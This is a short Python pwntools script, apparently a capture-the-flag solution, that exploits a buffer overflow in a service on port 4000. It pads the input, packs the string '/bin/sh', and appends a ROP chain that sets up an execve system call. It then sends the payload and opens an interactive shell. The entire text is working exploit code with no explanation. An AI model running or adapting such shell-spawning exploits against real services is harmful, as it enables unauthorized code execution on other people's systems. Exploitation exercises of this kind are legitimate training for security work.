#!/usr/bin/env python
from pwn import *

bin = 0x6e69622f
sh = 0x68732f
padding = "A"*91
padding += p32(bin) + p32(sh)

r = remote("0.0.0.0", 4000)
chain  = p32(134584585) + p32(0xb)
chain += p32(134513097) + p32(0xf6ffee64)
chain += p32(135127801) + p32(0x0)
chain += p32(134671114) + p32(0x0)
chain += p32(134662005)

chain += p32(134662005)
payload = padding + chain
r.sendline(payload)
r.interactive()
r.close()
